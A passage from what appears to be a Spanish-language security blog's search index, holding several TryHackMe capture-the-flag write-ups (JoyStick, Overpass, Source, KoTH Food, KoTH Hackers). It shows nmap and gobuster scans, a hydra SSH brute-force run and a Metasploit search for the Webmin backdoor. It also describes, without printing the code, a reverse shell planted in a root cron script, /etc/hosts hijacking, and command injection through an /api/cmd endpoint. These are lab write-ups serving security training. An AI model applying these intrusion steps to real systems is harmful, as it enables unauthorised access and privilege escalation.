entorno que nos devolvio una shell como root.","id":64,"section":"posts","tags":["wordpress","smbclient","steganography","steghide","wpscan","suid"],"title":"TryHackMe - Blog","uri":"https://sckull.github.io/posts/blog/"},{"content":"  JoyStick es una maquina de TryHackMe, realizamos un ataque de fuerza bruta en el servicio SSH para obtener acceso. Un CronJob nos permitio obtener acceso privilegiado.\nRoom    Titulo JoyStick      Descripción Anyone want to play?   Puntos *   Dificultad Facil   Maker DarkStar7471     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.80 scan initiated Fri Jul 17 00:47:51 2020 as: nmap -sV -o nmap_scan_mini joystick.thm Nmap scan report for joystick.thm (10.10.184.33) Host is up (0.19s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 17 00:48:28 2020 -- 1 IP address (1 host up) scanned in 37.10 seconds   FTP Intentamos ingresar con credenciales de anonymous en el servicio de FTP pero nos muestra un mensaje de error.\n1 2 3 4 5 6 7 8  root@upset:~/thm/joystick# ftp joystick.thm Connected to joystick.thm. 220 (vsFTPd 3.0.3) Name (joystick.thm:root): anonymous 500 OOPS: vsftpd: refusing to run with writable root inside chroot() Login failed. ftp\u0026gt; exit 421 Service not available, remote server has closed connection   HTTP Encontramos una pagina web en el puerto 80, en el codigo fuente encontramos un mensaje que menciona el usuario steve.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2  root@upset:~/thm/joystick# gobuster dir -u http://joystick.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.html (Status: 200)   STEVE - USER Utilizamos hydra para hacer un ataque de fuerza bruta en el servicio ssh con el usuario steve y el wordlist rockyou.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  root@upset:~/thm/joystick# hydra -l steve -P /usr/share/wordlists/rockyou.txt ssh://joystick.thm -t 64 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-17 01:12:12 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task [DATA] attacking ssh://joystick.thm:22/ [STATUS] 233.00 tries/min, 233 tries in 00:01h, 14344194 to do in 1026:04h, 64 active [STATUS] 215.00 tries/min, 645 tries in 00:03h, 14343800 to do in 1111:56h, 64 active [STATUS] 210.29 tries/min, 1472 tries in 00:07h, 14342999 to do in 1136:48h, 64 active [STATUS] 207.53 tries/min, 3113 tries in 00:15h, 14341391 to do in 1151:45h, 64 active [STATUS] 343.68 tries/min, 10654 tries in 00:31h, 14333874 to do in 695:08h, 64 active [22][ssh] host: joystick.thm\tlogin: steve password: [... snip ...] ^C   Ingresamos por SSH, obtenemos una shell y nuestra flag user.txt\nPRIVILEGE ESCALATION Utilizamos pspy64 para ver los cronjobs que se encuentran en la maquina, encontramos que se ejecuta el archivo /opt/minecraft/backup.sh.\nAgregamos una shell inversa al archivo y ponemos a la escucha netcat en nuestra maquina.\nObtenemos una shell con el usuario root.\nEncontramos la flag root.txt en /home/notch.\n","description":"JoyStick es una maquina de TryHackMe, realizamos un ataque de fuerza bruta en el servicio SSH para obtener acceso. Un CronJob nos permitio obtener acceso privilegiado.","id":65,"section":"posts","tags":["ftp","cron","hydra"],"title":"TryHackMe - JoyStick","uri":"https://sckull.github.io/posts/joystick/"},{"content":"  Overpass es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos web y analisis de codigo para obtener acceso. Escalamos privilegios con informacion presentada en Crontab.\nRoom    Titulo Overpass      Descripción What happens when some broke CompSci students make a password manager?   Puntos 110   Dificultad Facil   Maker NinjaJc01     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Fri Jul 17 16:58:39 2020 as: nmap -sV -o nmap_scan_mini overpass.thm Nmap scan report for overpass.thm (10.10.144.83) Host is up (0.20s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 17 16:59:17 2020 -- 1 IP address (1 host up) scanned in 37.41 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9  root@upset:~/thm/overpass# gobuster dir -u http://overpass.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.html (Status: 301) /img (Status: 301) /downloads (Status: 301) /aboutus (Status: 301) /admin (Status: 301) /admin.html (Status: 200) /css (Status: 301) /404.html (Status: 200)   En admin encontramos un panel, en el codigo fuente de este encontramos un archivo de javascript el cual al enviar el usuario y contraseña este verifica si la respuesta es \u0026quot;Incorrect Credentials\u0026quot;, si ese fuera el caso limpia el input de la contraseña, si la respuesta es diferente entonces establece una cookie con la respuesta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  [ ... REDACTED ...] async function login() { const usernameBox = document.querySelector(\u0026#34;#username\u0026#34;); const passwordBox = document.querySelector(\u0026#34;#password\u0026#34;); const loginStatus = document.querySelector(\u0026#34;#loginStatus\u0026#34;); loginStatus.textContent = \u0026#34;\u0026#34; const creds = { username: usernameBox.value, password: passwordBox.value } const response = await postData(\u0026#34;/api/login\u0026#34;, creds) const statusOrCookie = await response.text() if (statusOrCookie === \u0026#34;Incorrect credentials\u0026#34;) { loginStatus.textContent = \u0026#34;Incorrect Credentials\u0026#34; passwordBox.value=\u0026#34;\u0026#34; } else { Cookies.set(\u0026#34;SessionToken\u0026#34;,statusOrCookie) window.location = \u0026#34;/admin\u0026#34; } }   JAMES - USER En este caso no hay un control encuanto a las cookies por lo que podemos establecer una cookie cualquiera o vacia y logramos ver lo que esta restringido, utilizamos burpsuite para establecer la cookie en vacio y logramos ver el contenido, en donde nos muestra una clave privada encriptada y el nombre de un usuario (james).\nUtilizamos ssh2john para obtener el hash y john para obtener la frase del archivo.\nUtilizamos la frase y la clave, logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con cat /etc/crontab y encontramos un cronjob del usuario root, en el que descarga un archivo bash y lo ejecuta en la direccion overpass.thm.\nEditamos el archivo /etc/hosts y agregamos nuestra ip en lugar de la de overpass.thm.\nCreamos un archivo con una shell inversa, creamos un mini servidor con python3 -m http.server 80, ademas creamos dos carpetas /downloads/src/ en donde estará nuestro archivo de la shell. Esperamos a que haga la solicitud y ejecute nuestro archivo, logramos obtener una shell root y la flag root.txt.\n","description":"Overpass es una maquina de TryHackMe, es una serie de maquinas las cuales envuelven diferentes retos, en esta se presentan retos web y analisis de codigo para obtener acceso. Escalamos privilegios con informacion presentada en Crontab.","id":66,"section":"posts","tags":["cron"],"title":"TryHackMe - Overpass","uri":"https://sckull.github.io/posts/overpass/"},{"content":"  Source es una maquina de TryHackMe donde encontramos Webmin por donde obtuvimos acceso utilizando un exploit de Metasploit.\nRoom    Titulo Source      Descripción Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.   Puntos 60   Dificultad Facil   Maker DarkStar7471     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (10000) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.80 scan initiated Fri Jul 17 02:32:30 2020 as: nmap -sV -o nmap_scan_mini source.thm Nmap scan report for source.thm (10.10.133.161) Host is up (0.15s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 10000/tcp open http MiniServ 1.890 (Webmin httpd) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 17 02:33:40 2020 -- 1 IP address (1 host up) scanned in 69.98 seconds   HTTP Encontramos webmin en el puerto 10000.\nMETASPLOIT Utilizamos metasploit en donde encontramos el exploit exploit/unix/webapp/webmin_backdoor y lo usamos en contra la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  msf5 \u0026gt; search webmin Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/webmin/edit_html_fileaccess 2012-09-06 normal No Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access 1 auxiliary/admin/webmin/file_disclosure 2006-06-30 normal No Webmin File Disclosure 2 exploit/linux/http/webmin_packageup_rce 2019-05-16 excellent Yes Webmin Package Updates Remote Command Execution 3 exploit/unix/webapp/webmin_backdoor 2019-08-10 excellent Yes Webmin password_change.cgi Backdoor 4 exploit/unix/webapp/webmin_show_cgi_exec 2012-09-06 excellent Yes Webmin /file/show.cgi Remote Command Execution 5 exploit/unix/webapp/webmin_upload_exec 2019-01-17 excellent Yes Webmin Upload Authenticated RCE msf5 \u0026gt;   Logramos obtener una shell con el usuario root.\nTambien encontramos la flag user.txt y root.txt\n","description":"Source es una maquina de TryHackMe donde encontramos Webmin por donde obtuvimos acceso utilizando un exploit de Metasploit.","id":67,"section":"posts","tags":["metasploit"],"title":"TryHackMe - Source","uri":"https://sckull.github.io/posts/source/"},{"content":"  KoTH Food CTF es una maquina de TryHackMe parte de las maquinas de King of the Hill se presentan algunas formas para obtener acceso y escalar privilegios.\nRoom    Titulo KoTH Food CTF      Descripción Practice Food KoTH alone, to get familiar with KoTH!   Puntos 0   Dificultad Facil   Maker NinjaJc01     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (15065), mysql (3306) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  # Nmap 7.80 scan initiated Tue Jul 14 23:33:16 2020 as: nmap -sV -o nmap_scan_mini kothfood.thm Nmap scan report for kothfood.thm (10.10.77.34) Host is up (0.15s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1 9999/tcp open abyss? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : [... snip ...] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 14 23:35:18 2020 -- 1 IP address (1 host up) scanned in 122.15 seconds # Nmap 7.80 scan initiated Tue Jul 14 23:48:02 2020 as: nmap -sV -p- -T5 -o nmap_scan kothfood.thm Warning: 10.10.132.29 giving up on port because retransmission cap hit (2). Nmap scan report for kothfood.thm (10.10.132.29) Host is up (0.16s latency). Not shown: 65523 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1 9999/tcp open abyss? 15065/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) 16109/tcp open unknown 32229/tcp filtered unknown 46211/tcp filtered unknown 46969/tcp open telnet Linux telnetd 47002/tcp filtered unknown 48690/tcp filtered unknown 48972/tcp filtered unknown 52197/tcp filtered unknown 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : [... snip ...] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 15 00:01:53 2020 -- 1 IP address (1 host up) scanned in 830.63 seconds   Primera Parte A continuacion se muestran los dos caminos (partes) que se encontraron para obtener una shell y escalar privilegios, además el lugar donde se encuentran las flags.\nMYSQL Nos conecatmos en el puerto 3306 con las credenciales por default (root:), en donde encontramos una base de datos (users) que contiene unas credenciales y una flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  MySQL [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | users | +--------------------+ 5 rows in set (0.176 sec) MySQL [(none)]\u0026gt; use users; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MySQL [users]\u0026gt; show tables; +-----------------+ | Tables_in_users | +-----------------+ | User | +-----------------+ 1 row in set (0.152 sec) MySQL [users]\u0026gt; select * from User; +----------+---------------------------------------+ | username | password | +----------+---------------------------------------+ | ramen | ... snip ... | | flag | thm{... snip ...} | +----------+---------------------------------------+ 2 rows in set (0.149 sec) MySQL [users]\u0026gt;   RAMEN - USER Utilizamos las credenciales que encontramos en la base de datos en el servicio SSH, logramos obtener una shell.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion en la maquina y encontramos un archivo SUID screen-4.5.0. Ejecutamos el exploit y obtenemos una shell como usuario root.\nObtenemos una flag en la carpeta principal de este usuario.\nBuscamos la flag en el directorio / y logramos encontrar una en /home/bread/flag, /home/tryhackme/flag7 y /var/flag.txt.\nEncontramos otra dentro de la carpeta principal del usuario food (/home/food/.flag).\nVemos los puertos abiertos y nos muestra el puerto 16109, visitamos el puerto y vemos una imagen.\nDescargamos la imagen y extraemos archivos ocultos con steghide sin contraseña, donde encontramos las credenciales del usuario pasta.\nroot@upset:~/thm/kothfood# steghide extract -sf image.jpg Enter passphrase: wrote extracted data to \u0026quot;creds.txt\u0026quot;. root@upset:~/thm/kothfood# cat creds.txt pasta:... snip ... root@upset:~/thm/kothfood# Segunda Parte HTTP Encontramos una pagina web en el puerto 15065.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3  root@upset:~/thm/kothfood# gobuster dir -u http://kothfood.thm:15065/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 25 -x php,html,txt /index.html (Status: 301) /monitor (Status: 301)   En la pagina monitor en donde al pasarle una ip realiza un ping.\nLe pasamos nuestra IP y logramos recibir los paquetes.\nRevisamos el codigo fuente de la pagina y encontramos un archivo de javascript, que, en uno de los comentarios indica que el codigo está ofuscado. Encontramos una funcion que envia la IP a una API.\n1 2 3 4 5 6 7 8 9 10 11 12  async function pingHost() { const _0x25c165 = document[_0x4d67(\u0026#39;0x5\u0026#39;)](\u0026#39;#outputSection\u0026#39;); const _0x2e78af = document[_0x4d67(\u0026#39;0x5\u0026#39;)](_0x4d67(\u0026#39;0x2\u0026#39;)); const _0x1185f3 = _0x2e78af[_0x4d67(\u0026#39;0x1\u0026#39;)]; if (_0x1185f3 !== undefined \u0026amp;\u0026amp; _0x1185f3 !== \u0026#39;\u0026#39; \u0026amp;\u0026amp; ValidateIPaddress(_0x1185f3)) { _0x25c165[_0x4d67(\u0026#39;0x0\u0026#39;)] = _0x4d67(\u0026#39;0x6\u0026#39;) + _0x1185f3 + \u0026#39;\\x0a\u0026#39;; const _0x27c227 = await postData(\u0026#39;/api/cmd\u0026#39;, \u0026#39;ping -c 4 \u0026#39; + _0x1185f3); _0x25c165[\u0026#39;textContent\u0026#39;] += await _0x27c227[\u0026#39;text\u0026#39;](); } else { _0x25c165[_0x4d67(\u0026#39;0x0\u0026#39;)] = _0x4d67(\u0026#39;0x4\u0026#39;); } }   Enviamos un comando mediante el metodo POST utilizando CURL y logramos obtener el resultado.\nEjecutamos una shel inversa y logramos obtener una shell inversa con el usuario BREAD.\nGeneramos claves SSH para el usuario bread.\nAdemás agregamos nuestra clave en el archivo authorized_keys.\nIngresamos por el servicio ssh y enumeramos la maquina para buscar archivos para escalar privilegios.\n-rwsr-xr-x 1 root root 8.3K Jul 15 05:07 /tmp/rootshell -rwsr-sr-x 1 daemon daemon 51K Feb 20 2018 /usr/bin/at -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/chfn -rwsr-xr-x 1 root root 44K Mar 22 2019 /usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/gpasswd -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newgidmap -rwsr-xr-x 1 root root 40K Mar 22 2019 /usr/bin/newgrp -rwsr-xr-x 1 root root 37K Mar 22 2019 /usr/bin/newuidmap -rwsr-xr-x 1 root root 59K Mar 22 2019 /usr/bin/passwd -rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 1.6M Mar 20 03:04 /usr/bin/screen-4.5.0 -rwsr-xr-x 1 root root 146K Jan 18 2018 /usr/bin/sudo -rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils -rwsr-sr-x 1 root root 2.6M Jun 6 2019 /usr/bin/vim.basic -rwsr-xr-- 1 root messagebus 42K Jun 10 2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-sr-x 1 root root 107K Oct 30 2019 /usr/lib/snapd/snap-confine -rwsr-xr-- 1 root telnetd 11K Nov 7 2016 /usr/lib/telnetlogin -rwsr-xr-x 1 root root 99K Nov 23 2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic Encontramos un binario que al ejecutarlo /tmp/rootshell nos devuelve una shell como usuario root.\n","description":"KoTH Food CTF es una maquina de TryHackMe parte de las maquinas de King of the Hill se presentan algunas formas para obtener acceso y escalar privilegios.","id":68,"section":"posts","tags":[],"title":"TryHackMe - KoTH Food CTF","uri":"https://sckull.github.io/posts/kothfood/"},{"content":"  KoTH Hackers es una maquina de TryHackMe parte de las maquinas de King of the Hill se presentan algunas formas para obtener acceso y escalar privilegios.\nRoom    Titulo KoTH Hackers      Descripción The Hackers KoTH box, to allow you to practice alone!   Puntos 0   Dificultad Media   Maker NinjaJc01     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  # Nmap 7.80 scan initiated Fri Jul 10 16:49:57 2020 as: nmap -sV -p- -T5 -o nmap_scan kothhacker.thm Warning: 10.10.130.16 giving up on port because retransmission cap hit (2). Nmap scan report for kothhacker.thm (10.10.130.16) Host is up (0.15s latency). Not shown: 65488 closed ports, 43 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) 9999/tcp open abyss? 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9999-TCP:V=7.80%I=7%D=7/10%Time=5F08E4C8%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,75,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Fri,\\x2010\\x20Jul\\x2020 SF:20\\x2021:59:36\\x20GMT\\r\\nContent-Length:\\x201\\r\\nContent-Type:\\x20text/ SF:plain;\\x20charset=utf-8\\r\\n\\r\\n\\n\u0026#34;)%r(HTTPOptions,75,\u0026#34;HTTP/1\\.0\\x20200\\ SF:x20OK\\r\\nDate:\\x20Fri,\\x2010\\x20Jul\\x202020\\x2021:59:36\\x20GMT\\r\\nConte SF:nt-Length:\\x201\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\ SF:n\\n\u0026#34;)%r(FourOhFourRequest,75,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nDate:\\x20Fri,\\x SF:2010\\x20Jul\\x202020\\x2021:59:37\\x20GMT\\r\\nContent-Length:\\x201\\r\\nConte SF:nt-Type:\\x20text/plain;\\x20charset=utf-8\\r\\n\\r\\n\\n\u0026#34;)%r(GenericLines,67, SF:\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20 SF:charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r( SF:RTSPRequest,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\ SF:x20Request\u0026#34;)%r(Help,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-T SF:ype:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400 SF:\\x20Bad\\x20Request\u0026#34;)%r(SSLSessionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Req SF:uest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x2 SF:0close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TerminalServerCookie,67,\u0026#34;HTTP/1 SF:\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset SF:=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TLSSess SF:ionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/ SF:plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Re SF:quest\u0026#34;)%r(Kerberos,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Ty SF:pe:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\ SF:x20Bad\\x20Request\u0026#34;)%r(LPDString,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\ SF:r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20clos SF:e\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(LDAPSearchReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x SF:20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nCo SF:nnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(SIPOptions,67,\u0026#34;HTTP SF:/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20chars SF:et=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 10 17:01:09 2020 -- 1 IP address (1 host up) scanned in 671.62 seconds   HTTP Encontramos una pagina web en el puerto 80.\nAl revisar las hojas de estilo de la pagina, encontramos una flag.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10  root@upset:~/thm/kothhacker# gobuster dir -u http://kothhacker.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /backdoor (Status: 301) /contact (Status: 301) /img (Status: 301) /index.html (Status: 301) /index.html (Status: 301) /news (Status: 301) /robots.txt (Status: 200) /robots.txt (Status: 200) /staff (Status: 301)   Vemos que en backdoor existe un formulario de autenticacion.\nRevisamos el codigo fuente de esta pagina y encontramos un archivo javascript que realiza la autenticacion y que si esta es correcta redirige hacia otra pagina.\n1 2 3 4 5 6 7  if (statusOrCookie=== \u0026#34;Incorrect credentials\u0026#34;) { alert(\u0026#34;Incorrect Credentials\u0026#34;) passwordBox.value=\u0026#34;\u0026#34; } else { Cookies.set(\u0026#34;SessionToken\u0026#34;,statusOrCookie) window.location = \u0026#34;/backdoor/shell\u0026#34; }   /backdoor/shell es la pagina a la que nos redirige, analizamos la pagina y vemos que al visitarla nos redirige nuevamente al /, por lo que solo podemos leer el codigo fuente, en este ultimo encontramos un archivo Javascript en donde nuevamente verifica la auntenticacion con una cookie. Pero lo interesante es de que contiene un formulario en donde se pueden \u0026ldquo;ejecutar comandos\u0026rdquo; y lo hace mediante una api.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  async function runCommand(commandText) { if (commandText === \u0026#34;exit\u0026#34;) { Cookies.set(\u0026#34;SessionToken\u0026#34;,\u0026#34;\u0026#34;) window.location = \u0026#34;/\u0026#34; return } const outputBox = document.getElementById(\u0026#34;outputBox\u0026#34;); if (commandText === \u0026#34;clear\u0026#34;) { outputBox.textContent = \u0026#34;\u0026#34; return } outputBox.textContent += \u0026#34;plague@gibson:$ \u0026#34; + commandText + \u0026#34;\\n\u0026#34; outputBox.textContent += await (await postData(\u0026#34;/api/cmd\u0026#34;, commandText)).text() window.scrollBy(0, 1000); }   FTP Utilizamos las \u0026ldquo;credenciales\u0026rdquo; de anonymous (anonymous:anonymous) para ingresar por el servicio FTP, en donde logramos encontrar dos archivos, el primero contiene una flag y el segundo una nota.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  root@upset:~/thm/kothhacker# ftp kothhacker.thm Connected to kothhacker.thm. 220-Ellingson Mineral Company FTP Server 220- 220-WARNING 220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986 220 Name (kothhacker.thm:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Apr 30 04:42 . drwxr-xr-x 2 ftp ftp 4096 Apr 30 04:42 .. -rw-r--r-- 1 ftp ftp 38 Apr 30 04:42 .flag -rw-r--r-- 1 ftp ftp 400 Apr 29 03:57 note 226 Directory send OK. ftp\u0026gt; get .flag local: .flag remote: .flag 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .flag (38 bytes). 226 Transfer complete. 38 bytes received in 0.00 secs (189.3336 kB/s) ftp\u0026gt; get note local: note remote: note 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note (400 bytes). 226 Transfer complete. 400 bytes received in 0.00 secs (3.4060 MB/s) ftp\u0026gt; exit 221 Goodbye. root@upset:~/thm/kothhacker# cat note Note: Any users with passwords in this list: love sex god secret will be subject to an immediate disciplinary hearing. Any users with other weak passwords will be complained at, loudly. These users are: rcampbell:Robert M. Campbell:Weak password gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password Exposing the company\u0026#39;s cryptographic keys is a disciplinary offense. Eugene Belford, CSO root@upset:~/thm/kothhacker#   RCAMPBELL - SSH/HYDRA En la nota encontramos dos nombres de usuario en donde mencionan que tienen contraseñas debiles. Creamos un archivo de texto (users.txt) para utilizarlo junto con Hydra en el servicio ssh con el wordlist rockyou, y logramos obtener la contraseña para el usuario rcampbell y además el usuario gcrawford al parecer no tiene activado el acceso por este servicio.\nLogramos obtener una shell con el usuario rcampbell y una flag.\nRevisando los archivos FTP de configuracion encontramos otra flag.\nNo logramos encontrar ningun archivo que nos ayudara para escalar privilegios por lo que utilizamos nuevamente HYDRA con los usuarios encontrados en el servicio FTP. Logramos encontrar la misma contraseña para rcampbell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  root@upset:~/thm/kothhacker# ftp kothhacker.thm Connected to kothhacker.thm. 220-Ellingson Mineral Company FTP Server 220- 220-WARNING 220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986 220 Name (kothhacker.thm:root): rcampbell 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-x--- 4 ftp ftp 4096 Jul 10 22:39 . drwxr-x--- 4 ftp ftp 4096 Jul 10 22:39 .. lrwxrwxrwx 1 ftp ftp 9 Apr 30 01:33 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 ftp ftp 220 Apr 29 03:58 .bash_logout 